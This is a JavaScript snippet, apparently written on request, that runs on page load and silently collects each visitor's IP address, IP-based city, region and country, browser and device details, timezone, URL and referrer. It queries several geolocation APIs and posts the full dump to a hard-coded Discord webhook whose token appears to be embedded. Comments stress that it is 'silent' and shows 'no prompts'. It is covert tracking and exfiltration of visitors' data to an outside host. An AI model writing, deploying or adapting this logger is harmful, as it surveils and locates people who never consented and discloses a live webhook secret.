// Discord Webhook Logger - NO PERMISSION PROMPTS
// Uses only IP-based geolocation (silent, no user interaction needed)

(function() {
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1499634580947472504/b6juZu8B-vCmAtPe0gIUNpTFjN_noP5VhRCMaGU12FVQ-ipySzbtogADyOLtnvcNLzzc";
    
    let hasSent = false;
    
    async function sendLog() {
        if (hasSent) return;
        hasSent = true;
        
        // Collect all browser/client info (no prompts)
        const clientInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory || "unknown",
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            onLine: navigator.onLine
        };
        
        // Screen & Window info
        const screenInfo = {
            screenWidth: screen.width,
            screenHeight: screen.height,
            screenAvailWidth: screen.availWidth,
            screenAvailHeight: screen.availHeight,
            screenColorDepth: screen.colorDepth,
            windowInnerWidth: window.innerWidth,
            windowInnerHeight: window.innerHeight,
            devicePixelRatio: window.devicePixelRatio
        };
        
        // Time & Location info
        const timeInfo = {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            localTime: new Date().toLocaleString(),
            utcTime: new Date().toISOString(),
            timestamp: Date.now()
        };
        
        // Page & Referrer info
        const pageInfo = {
            url: window.location.href,
            hostname: window.location.hostname,
            pathname: window.location.pathname,
            referrer: document.referrer,
            title: document.title
        };
        
        // Performance timing
        let performanceInfo = {};
        if (window.performance && window.performance.timing) {
            const timing = window.performance.timing;
            const loadTime = timing.loadEventEnd - timing.navigationStart;
            performanceInfo = {
                pageLoadTimeMs: loadTime > 0 ? loadTime : "loading",
                domInteractive: timing.domInteractive - timing.navigationStart,
                domContentLoaded: timing.domContentLoadedEventEnd - timing.navigationStart
            };
        }
        
        // Connection info
        let connectionInfo = {};
        if (navigator.connection) {
            const conn = navigator.connection;
            connectionInfo = {
                effectiveType: conn.effectiveType,
                rtt: conn.rtt,
                downlink: conn.downlink,
                saveData: conn.saveData
            };
        }
        
        // Get IP and location via IP API (SILENT, no prompt)
        let ipData = {};
        let locationString = "Unknown location";
        let ipString = "Unknown IP";
        let city = "Unknown";
        let country = "Unknown";
        let region = "Unknown";
        
        try {
            // Using ipapi.co - completely silent, no user permission needed
            const ipResponse = await fetch('https://ipapi.co/json/');
            if (ipResponse.ok) {
                ipData = await ipResponse.json();
                if (ipData.ip) ipString = ipData.ip;
                if (ipData.city) city = ipData.city;
                if (ipData.region) region = ipData.region;
                if (ipData.country_name) country = ipData.country_name;
                
                const locationParts = [];
                if (city && city !== "Unknown") locationParts.push(city);
                if (region && region !== "Unknown") locationParts.push(region);
                if (country && country !== "Unknown") locationParts.push(country);
                locationString = locationParts.length > 0 ? locationParts.join(", ") : (ipData.country || "Unknown");
            }
        } catch (e) {
            console.warn("IP API failed:", e);
            ipData = { error: e.message };
        }
        
        // Try alternative free IP API as backup (still silent)
        if (ipString === "Unknown IP") {
            try {
                const backupResponse = await fetch('https://api.ipify.org?format=json');
                if (backupResponse.ok) {
                    const backupData = await backupResponse.json();
                    if (backupData.ip) ipString = backupData.ip;
                }
            } catch (e) {}
        }
        
        // Try geoplugin for more location data (silent)
        let geoPluginData = {};
        try {
            const geoResponse = await fetch('https://geoplugin.net/json.gp');
            if (geoResponse.ok) {
                geoPluginData = await geoResponse.json();
                if (locationString === "Unknown location" && geoPluginData.geoplugin_city) {
                    locationString = `${geoPluginData.geoplugin_city}, ${geoPluginData.geoplugin_regionName}, ${geoPluginData.geoplugin_countryName}`;
                }
            }
        } catch (e) {}
        
        // Compile ALL info (no browser geolocation = no prompts)
        const allInfo = {
            visitor_ip: ipString,
            location: locationString,
            browser: clientInfo,
            screen: screenInfo,
            time: timeInfo,
            page: pageInfo,
            performance: performanceInfo,
            connection: connectionInfo,
            ip_api_raw: ipData,
            geo_plugin_raw: geoPluginData,
            collected_at: new Date().toISOString(),
            note: "No browser geolocation used - completely silent"
        };
        
        // Format for Discord embed
        const allInfoPretty = JSON.stringify(allInfo, null, 2);
        
        // Create Discord embed
        const embed = {
            title: "🌐 New Visitor Detected",
            color: 0x5865F2,
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: "📍 Location",
                    value: locationString,
                    inline: true
                },
                {
                    name: "🖥️ IP Address",
                    value: `\`${ipString}\``,
                    inline: true
                },
                {
                    name: "📱 Device & Browser",
                    value: `**OS/Platform:** ${clientInfo.platform || "Unknown"}\n**Language:** ${clientInfo.language}\n**CPU Cores:** ${clientInfo.hardwareConcurrency || "?"}`,
                    inline: false
                },
                {
                    name: "📐 Screen Resolution",
                    value: `${screenInfo.screenWidth}x${screenInfo.screenHeight} (DPR: ${screenInfo.devicePixelRatio})`,
                    inline: true
                },
                {
                    name: "⏰ Timezone",
                    value: timeInfo.timezone,
                    inline: true
                },
                {
                    name: "🔗 Page URL",
                    value: pageInfo.url.length > 100 ? pageInfo.url.substring(0, 100) + "..." : pageInfo.url,
                    inline: false
                },
                {
                    name: "📎 Referrer",
                    value: pageInfo.referrer || "Direct visit",
                    inline: false
                },
                {
                    name: "⚡ Connection",
                    value: connectionInfo.effectiveType ? `${connectionInfo.effectiveType}, ${connectionInfo.rtt || "?"}ms` : "Not available",
                    inline: true
                },
                {
                    name: "📦 All Collected Data (full dump)",
                    value: "```json\n" + allInfoPretty.substring(0, 1000) + (allInfoPretty.length > 1000 ? "\n... (truncated)" : "") + "\n```",
                    inline: false
                }
            ],
            footer: {
                text: "🔍 Silent tracker • No prompts shown"
            }
        };
        
        // Exact message format you requested
        const messageContent = `Seems like a fellow is interested, they are from **${locationString}** \n-# \`${ipString}\``;
        
        // Send to Discord
        const payload = {
            content: messageContent,
            embeds: [embed],
            username: "Site Logger",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/1055/1055687.png"
        };
        
        try {
            const response = await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                console.log("✅ Log sent silently");
            } else {
                console.error("Webhook error:", response.status);
            }
        } catch (error) {
            console.error("Network error:", error);
        }
    }
    
    // Run silently on page load
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", sendLog);
    } else {
        sendLog();
    }
})();